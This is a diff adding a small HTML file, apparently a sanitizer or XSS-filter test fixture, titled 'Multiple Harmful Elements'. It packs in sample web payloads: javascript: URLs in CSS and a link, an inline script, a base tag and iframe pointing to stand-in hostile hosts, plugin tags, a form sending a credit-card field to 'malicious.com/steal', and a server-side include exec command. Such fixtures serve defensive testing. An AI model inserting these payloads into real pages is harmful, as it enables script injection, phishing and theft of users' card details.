@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head><title>Multiple Harmful Elements</title>
+<base href="http://phish.com/">
+<style>div{background:url('javascript:alert(1)')};</style>
+</head>
+<body>
+<script>alert('bad')</script>
+<iframe src="http://evil.com"></iframe>
+<object data="bad.swf"></object>
+<embed src="bad.swf">
+<applet code="evil"></applet>
+<form action="http://malicious.com/steal"><input name="cc"></form>
+<a href="javascript:alert('xss')">JS link</a>
+<!--#exec cmd="ls"-->
+</body>
+</html>
